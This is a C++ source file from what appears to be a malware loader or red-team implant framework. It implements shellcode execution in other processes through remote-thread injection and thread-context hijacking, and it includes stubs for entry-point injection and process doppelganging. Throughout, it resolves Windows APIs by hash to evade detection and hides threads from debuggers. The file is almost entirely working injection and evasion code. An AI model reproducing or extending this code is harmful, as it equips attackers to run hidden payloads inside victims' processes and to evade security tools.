#include "execute.hpp"

namespace execute {
	//
	// Remote Thread Injection
	//
	BOOL CreateRemoteThreadInjection(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size)
	{
		PVOID address_ptr = NULL;
		BOOL success = FALSE;
		HANDLE thread_handle = INVALID_HANDLE_VALUE;
		SIZE_T bytes_written = 0;
		HMODULE kernel32 = NULL;
		HMODULE ntdll = NULL;

#pragma region Imports

		typeGetLastError GetLastErrorC = NULL;
		typeVirtualFreeEx VirtualFreeExC = NULL;
		typeCreateRemoteThread CreateRemoteThreadC = NULL;
		typeNtWaitForSingleObject NtWaitForSingleObjectC = NULL;

		constexpr ULONG hash_kernel32 = malapi::HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
		constexpr ULONG hash_ntdll = malapi::HashStringFowlerNollVoVariant1a("ntdll.dll");
		constexpr ULONG hash_getlasterror = malapi::HashStringFowlerNollVoVariant1a("GetLastError");
		constexpr ULONG hash_createremotethread = malapi::HashStringFowlerNollVoVariant1a("CreateRemoteThread");
		constexpr ULONG hash_ntwaitforsingleobject = malapi::HashStringFowlerNollVoVariant1a("NtWaitForSingleObject");
		constexpr ULONG hash_virtualfreeex = malapi::HashStringFowlerNollVoVariant1a("VirtualFreeEx");

		kernel32 = malapi::GetModuleHandleC(hash_kernel32);
		ntdll = malapi::GetModuleHandleC(hash_ntdll);
		if (!kernel32 || !ntdll) goto CLEANUP;

		GetLastErrorC = (typeGetLastError)malapi::GetProcAddressC(kernel32, hash_getlasterror);
		CreateRemoteThreadC = (typeCreateRemoteThread)malapi::GetProcAddressC(kernel32, hash_createremotethread);
		NtWaitForSingleObjectC = (typeNtWaitForSingleObject)malapi::GetProcAddressC(ntdll, hash_ntwaitforsingleobject);
		VirtualFreeExC = (typeVirtualFreeEx)malapi::GetProcAddressC(kernel32, hash_virtualfreeex);

#pragma endregion

		address_ptr = malapi::WriteShellcodeMemory(process_handle, shellcode, shellcode_size);

		thread_handle = CreateRemoteThreadC(process_handle, 0, 0, (LPTHREAD_START_ROUTINE)address_ptr, NULL, NULL, NULL);
		if (thread_handle == NULL)
		{
			LOG_ERROR("Error during CreateRemoteThread (Code: %08lX)", GetLastErrorC());
			goto CLEANUP;
		}
		else LOG_SUCCESS("Handle to Thread: 0x%08lX", thread_handle);

		NtWaitForSingleObjectC(thread_handle, NULL, NULL);
		success = TRUE;

	CLEANUP:
		if (process_handle)
		{
			VirtualFreeExC(process_handle, (LPVOID)address_ptr, 0, MEM_RELEASE);
		}
		return success;
	}

	//
	//Remote Thread Hijacking via Thread Enumeration
	//
	BOOL RemoteHijack(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size)
	{
		BOOL success = FALSE;
		HMODULE kernel32 = NULL;
		HMODULE ntdll = NULL;
		PVOID address_ptr = NULL;
		DWORD pid = 0;
		HANDLE proc_snapshot = NULL;
		HANDLE thread_handle = NULL;
		THREADENTRY32 thread_entry;
		CONTEXT context;

#pragma region Imports

		typeGetLastError GetLastErrorC = NULL;
		typeCloseHandle CloseHandleC = NULL;
		typeVirtualFreeEx VirtualFreeExC = NULL;
		typeGetProcessId GetProcessIdC = NULL;
		typeNtWaitForSingleObject NtWaitForSingleObjectC = NULL;
		typeOpenThread OpenThreadC = NULL;
		typeThread32First Thread32FirstC = NULL;
		typeThread32Next Thread32NextC = NULL;
		typeCreateToolhelp32Snapshot CreateToolhelp32SnapshotC = NULL;
		typeSuspendThread SuspendThreadC = NULL;
		typeResumeThread ResumeThreadC = NULL;
		typeGetThreadContext GetThreadContextC = NULL;
		typeSetThreadContext SetThreadContextC = NULL;
		typeNtResumeThread NtResumeThreadC = NULL;
		typeNtClose NtCloseC = NULL;

		constexpr ULONG hash_kernel32 = malapi::HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
		constexpr ULONG hash_ntdll = malapi::HashStringFowlerNollVoVariant1a("ntdll.dll");
		constexpr ULONG hash_getlasterror = malapi::HashStringFowlerNollVoVariant1a("GetLastError");
		constexpr ULONG hash_closehandle = malapi::HashStringFowlerNollVoVariant1a("CloseHandle");
		constexpr ULONG hash_virtualfreeex = malapi::HashStringFowlerNollVoVariant1a("VirtualFreeEx");
		constexpr ULONG hash_getprocessid = malapi::HashStringFowlerNollVoVariant1a("GetProcessId");
		constexpr ULONG hash_ntwaitforsingleobject = malapi::HashStringFowlerNollVoVariant1a("NtWaitForSingleObject");
		constexpr ULONG hash_ntresumethread = malapi::HashStringFowlerNollVoVariant1a("NtResumeThread");
		constexpr ULONG hash_ntclose = malapi::HashStringFowlerNollVoVariant1a("NtClose");

		constexpr ULONG hash_createtoolhelp32snapshot = malapi::HashStringFowlerNollVoVariant1a("CreateToolhelp32Snapshot");
		constexpr ULONG hash_thread32first = malapi::HashStringFowlerNollVoVariant1a("Thread32First");
		constexpr ULONG hash_thread32next = malapi::HashStringFowlerNollVoVariant1a("Thread32Next");
		constexpr ULONG hash_openthread = malapi::HashStringFowlerNollVoVariant1a("OpenThread");
		constexpr ULONG hash_suspendthread = malapi::HashStringFowlerNollVoVariant1a("SuspendThread");
		constexpr ULONG hash_resumethread = malapi::HashStringFowlerNollVoVariant1a("ResumeThread");
		constexpr ULONG hash_gethreadcontext = malapi::HashStringFowlerNollVoVariant1a("GetThreadContext");
		constexpr ULONG hash_sethreadcontext = malapi::HashStringFowlerNollVoVariant1a("SetThreadContext");

		kernel32 = malapi::GetModuleHandleC(hash_kernel32);
		ntdll = malapi::GetModuleHandleC(hash_ntdll);
		if (!kernel32 || !ntdll) goto CLEANUP;

		GetLastErrorC = (typeGetLastError)malapi::GetProcAddressC(kernel32, hash_getlasterror);
		CloseHandleC = (typeCloseHandle)malapi::GetProcAddressC(kernel32, hash_closehandle);
		VirtualFreeExC = (typeVirtualFreeEx)malapi::GetProcAddressC(kernel32, hash_virtualfreeex);
		CreateToolhelp32SnapshotC = (typeCreateToolhelp32Snapshot)malapi::GetProcAddressC(kernel32, hash_createtoolhelp32snapshot);
		Thread32FirstC = (typeThread32First)malapi::GetProcAddressC(kernel32, hash_thread32first);
		Thread32NextC = (typeThread32Next)malapi::GetProcAddressC(kernel32, hash_thread32next);
		GetProcessIdC = (typeGetProcessId)malapi::GetProcAddressC(kernel32, hash_getprocessid);
		OpenThreadC = (typeOpenThread)malapi::GetProcAddressC(kernel32, hash_openthread);
		SuspendThreadC = (typeSuspendThread)malapi::GetProcAddressC(kernel32, hash_suspendthread);
		ResumeThreadC = (typeResumeThread)malapi::GetProcAddressC(kernel32, hash_resumethread);
		GetThreadContextC = (typeGetThreadContext)malapi::GetProcAddressC(kernel32, hash_gethreadcontext);
		SetThreadContextC = (typeSetThreadContext)malapi::GetProcAddressC(kernel32, hash_sethreadcontext);

		NtWaitForSingleObjectC = (typeNtWaitForSingleObject)malapi::GetProcAddressC(ntdll, hash_ntwaitforsingleobject);
		NtResumeThreadC = (typeNtResumeThread)malapi::GetProcAddressC(ntdll, hash_ntresumethread);
		NtCloseC = (typeNtClose)malapi::GetProcAddressC(ntdll, hash_ntclose);

#pragma endregion

		context.ContextFlags = CONTEXT_FULL;
		thread_entry.dwSize = sizeof(THREADENTRY32);

		address_ptr = malapi::WriteShellcodeMemory(process_handle, shellcode, shellcode_size);

		proc_snapshot = CreateToolhelp32SnapshotC(TH32CS_SNAPTHREAD, 0);
		LOG_INFO("Process Snapshot: %08lX", proc_snapshot);

		Thread32FirstC(proc_snapshot, &thread_entry);
		pid = GetProcessIdC(process_handle);

		if (pid != 0)
		{
			LOG_SUCCESS("Got PID: %d", pid);
		}

		while (Thread32NextC(proc_snapshot, &thread_entry))
		{
			if (thread_entry.th32OwnerProcessID == pid)
			{
				thread_handle = OpenThreadC(THREAD_ALL_ACCESS, FALSE, thread_entry.th32ThreadID);
				LOG_SUCCESS("Successfuly hijacked thread: %016llX", thread_handle);
				break;
			}
		}

		malapi::HideFromDebugger(thread_handle);

		if (!SuspendThreadC(thread_handle))
		{
			return LOG_ERROR("Failed to suspend thread. (Code: %016llX)", GetLastErrorC());
			goto CLEANUP;
		}
		LOG_SUCCESS("Thread Suspended.");

		if (!GetThreadContextC(thread_handle, &context))
		{
			return LOG_ERROR("GetThreadContext Failed. (Code: %016llX)", GetLastErrorC());
			goto CLEANUP;
		}
		LOG_SUCCESS("Got Thread Context.");

		context.Rip = (DWORD_PTR)address_ptr;
		if (!SetThreadContextC(thread_handle, &context))
		{
			return LOG_ERROR("SetThreadContext Failed. (Code: %016llX)", GetLastErrorC());
			goto CLEANUP;
		}
		LOG_SUCCESS("Set Thread Context.");

		NtResumeThreadC(thread_handle, NULL);
		NtResumeThreadC(thread_handle, NULL);

		LOG_SUCCESS("Thread Resumed.");

		NtWaitForSingleObjectC(thread_handle, NULL, NULL);

		success = TRUE;

	CLEANUP:
		VirtualFreeExC(thread_handle, (LPVOID)address_ptr, 0, MEM_RELEASE);
		return success;
	}

	//
	// AddressOfEntryPoint Injection
	//
	BOOL AddressOfEntryPoint(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size)
	{
		BOOL success = FALSE;
		HMODULE ntdll = NULL;

#pragma region NTDLL_Imports

		typeNtResumeThread NtResumeThreadC = NULL;
		typeNtClose NtCloseC = NULL;

		constexpr ULONG hash_ntresumethread = malapi::HashStringFowlerNollVoVariant1a("NtResumeThread");
		constexpr ULONG hash_ntclose = malapi::HashStringFowlerNollVoVariant1a("NtClose");
		constexpr ULONG hash_ntdll = malapi::HashStringFowlerNollVoVariant1a("ntdll.dll");

		ntdll = malapi::GetModuleHandleC(hash_ntdll);
		if (!ntdll) goto CLEANUP;
		NtResumeThreadC = (typeNtResumeThread)malapi::GetProcAddressC(ntdll, hash_ntresumethread);
		NtCloseC = (typeNtClose)malapi::GetProcAddressC(ntdll, hash_ntclose);

#pragma endregion

		NtResumeThreadC(process_handle, NULL); // From CONFIG_CREATE_PROCESS 3
		success = TRUE;

	CLEANUP:
		NtCloseC(process_handle);
		return success;
	}

	//
	// Process Doppleganging
	//
	BOOL Doppleganger(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size)
	{
		BOOL success = FALSE;
		HMODULE kernel32 = NULL;

#pragma region [Kernel32 Functions]

		typeGetLastError GetLastErrorC = NULL;
		typeCloseHandle CloseHandleC = NULL;

		constexpr ULONG hash_kernel32 = malapi::HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
		constexpr ULONG hash_getlasterror = malapi::HashStringFowlerNollVoVariant1a("GetLastError");
		constexpr ULONG hash_closehandle = malapi::HashStringFowlerNollVoVariant1a("CloseHandle");

		kernel32 = malapi::GetModuleHandleC(hash_kernel32);
		if (kernel32 == NULL)
		{
			LOG_ERROR("GetModuleHandle Failed to import Kernel32");
			goto CLEANUP;
		}

		GetLastErrorC = (typeGetLastError)malapi::GetProcAddressC(kernel32, hash_getlasterror);
		CloseHandleC = (typeCloseHandle)malapi::GetProcAddressC(kernel32, hash_closehandle);

#pragma endregion

		success = TRUE;

	CLEANUP:
		// CloseHandleC(process_handle);
		// CloseHandleC(thread_handle);
		return success;
	}
} // End of execute namespace
